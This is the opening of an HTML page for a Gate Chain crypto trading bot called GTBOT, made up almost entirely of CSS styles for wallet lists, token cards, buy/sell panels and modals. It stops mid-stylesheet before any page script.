<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GTBOT - Gate Chain Trading Bot</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 25%, #cbd5e1 50%, #94a3b8 75%, #64748b 100%);
            min-height: 100vh;
            color: #1e293b;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 20%, rgba(59, 130, 246, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(147, 197, 253, 0.06) 0%, transparent 50%),
                radial-gradient(circle at 40% 60%, rgba(96, 165, 250, 0.04) 0%, transparent 50%);
            animation: backgroundFloat 20s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes backgroundFloat {
            0%, 100% { 
                opacity: 0.8; 
                transform: translateY(0px) rotate(0deg);
            }
            33% { 
                opacity: 1; 
                transform: translateY(-10px) rotate(1deg);
            }
            66% { 
                opacity: 0.9; 
                transform: translateY(5px) rotate(-1deg);
            }
        }

        /* 添加粒子效果 */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, rgba(59, 130, 246, 0.1), transparent),
                radial-gradient(2px 2px at 40px 70px, rgba(147, 197, 253, 0.08), transparent),
                radial-gradient(1px 1px at 90px 40px, rgba(96, 165, 250, 0.06), transparent),
                radial-gradient(1px 1px at 130px 80px, rgba(59, 130, 246, 0.04), transparent),
                radial-gradient(2px 2px at 160px 30px, rgba(147, 197, 253, 0.08), transparent);
            background-repeat: repeat;
            background-size: 200px 100px;
            animation: particleMove 30s linear infinite;
            z-index: -1;
        }

        @keyframes particleMove {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-100px); }
        }

        /* 添加鼠标跟随光效 */
        .mouse-glow {
            position: fixed;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
            border-radius: 50%;
            pointer-events: none;
            z-index: -1;
            transition: all 0.1s ease;
            opacity: 0;
        }

        /* 添加加载动画 */
        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            border-top-color: #3b82f6;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* 添加脉冲效果 */
        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 40px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 24px;
            backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.15),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
        }

        .header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(59, 130, 246, 0.15), transparent);
            animation: headerRotate 10s linear infinite;
            z-index: -1;
        }

        @keyframes headerRotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .header h1 {
            font-size: 52px;
            font-weight: 900;
            background: linear-gradient(135deg, #1e40af, #3b82f6, #60a5fa, #1e293b);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 15px;
            position: relative;
            animation: titleGlow 3s ease-in-out infinite alternate;
        }

        @keyframes titleGlow {
            0% { 
                filter: drop-shadow(0 0 10px rgba(59, 130, 246, 0.3));
            }
            100% { 
                filter: drop-shadow(0 0 20px rgba(59, 130, 246, 0.6));
            }
        }

        .header p {
            color: rgba(30, 41, 59, 0.7);
            font-size: 16px;
            letter-spacing: 1px;
            font-weight: 400;
        }

        .header-content {
            display: flex;
            align-items: center;
            gap: 30px;
            width: 100%;
        }

        .header-bots {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .header-text {
            flex: 1;
            text-align: center;
        }

        .bot-image {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
        }

        .bot-image:hover {
            transform: translateY(-5px) scale(1.05);
        }

        .bot-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid rgba(59, 130, 246, 0.3);
            object-fit: cover;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.2);
            transition: all 0.3s;
        }

        .bot-img:hover {
            border-color: #3b82f6;
            box-shadow: 0 12px 32px rgba(59, 130, 246, 0.3);
        }


        .stats-panel {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 20px;
            padding: 24px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.1);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.6s;
        }

        .stat-card:hover::before {
            left: 100%;
        }

        .stat-card:hover {
            transform: translateY(-8px) scale(1.02);
            border-color: #3b82f6;
            box-shadow: 
                0 20px 40px rgba(59, 130, 246, 0.25),
                0 0 0 1px rgba(255, 255, 255, 0.8);
        }

        .stat-icon {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .stat-label {
            font-size: 12px;
            color: rgba(30, 41, 59, 0.6);
            text-transform: uppercase;
            margin-bottom: 5px;
            font-weight: 500;
        }

        .stat-value {
            font-size: 28px;
            font-weight: bold;
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
        }

        .active-wallets-status {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 20px;
            padding: 20px 24px;
            margin-bottom: 24px;
            backdrop-filter: blur(15px);
            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.15);
        }

        .status-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .status-title {
            font-size: 14px;
            font-weight: 600;
            color: #3b82f6;
        }

        .status-count {
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            color: #ffffff;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: bold;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .status-wallets {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }

        .status-wallet-item {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            padding: 8px 12px;
            font-size: 11px;
            font-family: 'Courier New', monospace;
            color: #3b82f6;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .status-wallet-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.5s;
        }

        .status-wallet-item:hover::before {
            left: 100%;
        }

        .status-wallet-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
        }

        .main-grid {
            display: grid;
            grid-template-columns: 450px 1fr;
            gap: 25px;
            margin-bottom: 25px;
        }

        .panel {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 24px;
            padding: 28px;
            backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.1);
        }

        .panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.6), transparent);
        }

        .panel-glow {
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.15),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
        }

        .section-title {
            font-size: 20px;
            margin-bottom: 24px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(59, 130, 246, 0.2);
            font-weight: 600;
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 12px;
            position: relative;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 40px;
            height: 2px;
            background: linear-gradient(90deg, #1e40af, #3b82f6);
            border-radius: 1px;
        }

        .wallet-list {
            max-height: 600px;
            overflow-y: auto;
            padding-right: 10px;
        }

        .wallet-item {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 16px;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.08);
        }

        .wallet-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.6s;
        }

        .wallet-item:hover::before {
            left: 100%;
        }

        .wallet-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateX(8px) translateY(-2px);
            box-shadow: 0 12px 24px rgba(59, 130, 246, 0.2);
        }

        .wallet-item.active {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            border-color: #3b82f6;
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.25),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
        }

        .wallet-item.active::after {
            content: '✓';
            position: absolute;
            top: 12px;
            right: 12px;
            width: 24px;
            height: 24px;
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
            color: #ffffff;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
        }

        .wallet-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .wallet-address {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            transition: all 0.3s;
        }

        .wallet-address:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.15);
        }

        .wallet-balances {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .balance-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .balance-label {
            color: rgba(30, 41, 59, 0.6);
        }

        .balance-value {
            color: #3b82f6;
            font-weight: bold;
        }

        .token-list {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid rgba(59, 130, 246, 0.1);
        }

        .token-list-title {
            font-size: 11px;
            color: rgba(30, 41, 59, 0.5);
            margin-bottom: 8px;
            text-transform: uppercase;
            font-weight: 500;
        }

        .token-item {
            display: grid;
            grid-template-columns: auto 1fr auto auto;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.15);
            border-radius: 12px;
            margin-bottom: 8px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            font-size: 13px;
            position: relative;
            overflow: hidden;
        }

        .token-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.5s;
        }

        .token-item:hover::before {
            left: 100%;
        }

        .token-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-color: #3b82f6;
            transform: translateX(6px) translateY(-1px);
            box-shadow: 0 8px 16px rgba(59, 130, 246, 0.15);
        }

        .token-logo {
            width: 28px;
            height: 28px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: bold;
            color: #3b82f6;
            box-shadow: 0 4px 8px rgba(59, 130, 246, 0.2);
        }

        .token-info {
            display: flex;
            flex-direction: column;
        }

        .token-symbol {
            font-weight: bold;
            color: #1e293b;
        }

        .token-name {
            font-size: 11px;
            color: rgba(30, 41, 59, 0.6);
        }

        .token-balance {
            color: #3b82f6;
            font-weight: 600;
        }

        .copy-btn {
            padding: 6px 10px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            font-size: 11px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .copy-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.4s;
        }

        .copy-btn:hover::before {
            left: 100%;
        }

        .copy-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(59, 130, 246, 0.2);
        }

        .toggle-switch {
            position: relative;
            width: 52px;
            height: 28px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-radius: 28px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .toggle-switch.active {
            background: linear-gradient(135deg, #3b82f6, #60a5fa);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .toggle-switch::after {
            content: '';
            position: absolute;
            width: 24px;
            height: 24px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border-radius: 50%;
            top: 2px;
            left: 2px;
            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.2);
        }

        .toggle-switch.active::after {
            transform: translateX(24px);
        }

        .add-wallet-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            border: none;
            border-radius: 16px;
            color: #ffffff;
            font-weight: bold;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            margin-top: 16px;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.3);
        }

        .add-wallet-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: left 0.6s;
        }

        .add-wallet-btn:hover::before {
            left: 100%;
        }

        .add-wallet-btn:hover {
            transform: translateY(-4px) scale(1.02);
            box-shadow: 0 16px 40px rgba(59, 130, 246, 0.4);
        }


        .platform-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .platform-tab {
            flex: 1;
            padding: 12px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            color: #1e293b;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s;
            font-weight: 600;
        }

        .platform-tab.active {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            border-color: transparent;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .dex-options {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }

        .dex-option {
            padding: 15px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 10px;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s;
        }

        .dex-option.selected {
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2);
        }

        .dex-name {
            font-weight: bold;
            margin-bottom: 5px;
            color: #1e293b;
        }

        .dex-type {
            font-size: 11px;
            color: rgba(30, 41, 59, 0.6);
        }

        /* 协议标识样式 */
        .token-info-protocol {
            margin-top: 8px;
        }

        .protocol-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .protocol-badge.gtlaunch {
            background: linear-gradient(135deg, #10b981, #059669);
            color: white;
            box-shadow: 0 2px 4px rgba(16, 185, 129, 0.3);
        }

        .protocol-badge.dyor_internal {
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            color: white;
            box-shadow: 0 2px 4px rgba(139, 92, 246, 0.3);
        }

        /* 合约余额显示样式 */
        .contract-balance-display {
            margin-top: 12px;
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(5, 150, 105, 0.05));
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 12px;
            padding: 16px;
            backdrop-filter: blur(10px);
        }

        .contract-balance-header {
            margin-bottom: 12px;
        }

        .contract-balance-title {
            font-size: 14px;
            font-weight: 600;
            color: #059669;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .contract-balance-title::before {
            content: '💰';
            font-size: 16px;
        }

        .contract-balance-content {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .balance-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 8px;
            border: 1px solid rgba(16, 185, 129, 0.1);
        }

        .balance-label {
            font-size: 12px;
            color: rgba(30, 41, 59, 0.7);
            font-weight: 500;
        }

        .balance-value {
            font-size: 14px;
            font-weight: bold;
            color: #059669;
            text-shadow: 0 0 10px rgba(5, 150, 105, 0.3);
        }

        .control-group {
            display: flex;
            flex-direction: column;
            margin-bottom: 16px;
        }

        .control-group label {
            margin-bottom: 8px;
            font-size: 13px;
            font-weight: 600;
            color: #1e293b;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .control-group input {
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            color: #1e293b;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }

        .control-group input:focus {
            outline: none;
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2), 0 4px 12px rgba(59, 130, 246, 0.1);
        }

        .gas-speed-btn {
            flex: 1;
            padding: 12px 16px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 2px solid rgba(59, 130, 246, 0.2);
            border-radius: 12px;
            color: #3b82f6;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            font-size: 13px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.1);
        }

        .gas-speed-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
            transition: left 0.5s;
        }

        .gas-speed-btn:hover::before {
            left: 100%;
        }

        .gas-speed-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.2);
        }

        .gas-speed-btn.active {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            border-color: transparent;
            box-shadow: 0 8px 24px rgba(59, 130, 246, 0.3);
        }

        .gas-speed-btn:active {
            transform: translateY(0) scale(0.98);
        }

        .expected-returns {
            margin-top: 12px;
            padding: 12px;
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(34, 197, 94, 0.05));
            border: 1px solid rgba(16, 185, 129, 0.2);
            border-radius: 8px;
            animation: slideInDown 0.3s ease-out;
        }

        .expected-returns-content {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .expected-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
        }

        .expected-label {
            color: rgba(30, 41, 59, 0.7);
            font-weight: 500;
        }

        .expected-value {
            color: #10b981;
            font-weight: bold;
            font-family: 'Courier New', monospace;
        }

        .trading-windows {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }

        .trading-window {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 16px;
            padding: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(59, 130, 246, 0.1);
            transition: all 0.3s ease;
        }

        .trading-window:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(59, 130, 246, 0.15);
        }

        .buy-window {
            border-left: 4px solid #3b82f6;
        }

        .sell-window {
            border-left: 4px solid #ef4444;
        }

        .window-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding-bottom: 12px;
            border-bottom: 1px solid rgba(59, 130, 246, 0.1);
        }

        .window-icon {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(96, 165, 250, 0.05));
            border-radius: 50%;
            border: 1px solid rgba(59, 130, 246, 0.2);
            overflow: hidden;
        }

        .sell-window .window-icon {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(248, 113, 113, 0.05));
            border-color: rgba(239, 68, 68, 0.2);
        }

        .window-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            border-radius: 50%;
        }

        .window-title {
            font-size: 16px;
            font-weight: 700;
            color: #1e293b;
        }

        .window-content {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .window-content .control-group {
            margin-bottom: 0;
        }

        .window-content .control-group label {
            font-size: 13px;
            font-weight: 600;
            color: #1e293b;
            margin-bottom: 8px;
        }

        .window-content .amount-controls {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .window-content .amount-controls input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            color: #1e293b;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }

        .window-content .amount-controls input:focus {
            outline: none;
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }

        .window-content .percentage-buttons {
            display: flex;
            gap: 6px;
        }

        .window-content .percentage-btn {
            flex: 1;
            padding: 8px 12px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 12px;
        }

        .window-content .percentage-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: translateY(-1px);
        }

        .window-content .action-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 10px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
            text-transform: uppercase;
            margin-top: 8px;
        }

        .window-content .buy-btn {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.3);
        }

        .window-content .sell-btn {
            background: linear-gradient(135deg, #dc2626, #ef4444);
            color: #ffffff;
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.3);
        }

        .window-content .action-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        }

        .window-content .action-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }



        .transaction-log {
            max-height: 400px;
            overflow-y: auto;
        }

        .log-container {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .log-entry {
            padding: 14px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 12px;
            border-left: 4px solid rgba(59, 130, 246, 0.3);
            transition: all 0.2s;
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.1);
        }

        .log-entry.success {
            border-left-color: #10b981;
        }

        .log-entry.error {
            border-left-color: #ef4444;
        }

        .log-time {
            color: rgba(30, 41, 59, 0.6);
            font-size: 12px;
            font-weight: 600;
            min-width: 70px;
        }

        .log-message {
            flex: 1;
            color: #1e293b;
            font-weight: 500;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        }

        .modal-content {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.9));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 24px;
            padding: 32px;
            width: 90%;
            max-width: 450px;
            box-shadow: 
                0 20px 60px rgba(59, 130, 246, 0.2),
                0 0 0 1px rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
        }

        .token-details-modal {
            max-width: 500px;
        }

        .modal-title {
            font-size: 26px;
            margin-bottom: 24px;
            background: linear-gradient(135deg, #1e40af, #3b82f6, #1e293b);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }

        .modal-input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 8px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            color: #1e293b;
            font-family: monospace;
            font-size: 14px;
            transition: all 0.3s;
        }

        .modal-input:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 
                0 0 0 2px rgba(59, 130, 246, 0.2),
                0 4px 12px rgba(59, 130, 246, 0.1);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
        }

        .modal-input.loading {
            border-color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2);
        }

        .modal-input.error {
            border-color: #ef4444;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(254, 226, 226, 0.6));
            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
        }

        .modal-input.success {
            border-color: #10b981;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(220, 252, 231, 0.8));
            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
        }

        /* 代币信息显示区域样式 */
        .token-info-display {
            margin-top: 12px;
            padding: 20px;
